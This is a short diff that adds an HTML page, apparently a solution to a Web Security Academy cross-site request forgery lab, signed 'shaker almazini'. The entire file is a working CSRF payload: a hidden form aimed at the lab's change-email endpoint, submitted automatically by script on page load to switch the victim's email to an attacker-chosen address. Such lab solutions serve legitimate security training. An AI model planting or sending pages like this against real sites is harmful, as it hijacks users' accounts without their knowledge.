@@ -1,0 +1,13 @@
+<html>
+<body>
+<form method="GET" action="https://aca91fa41ea2a2efc09e149f00480045.web-security-academy.net/my-account/change-email" id="lab2">
+    <input type="hidden" name="email" value="shaker@gmail.com"/>
+</form>
+</body>
+<script>
+    document.forms['lab2'].submit();
+</script>
+<html>
+
+
+#shaker almazini
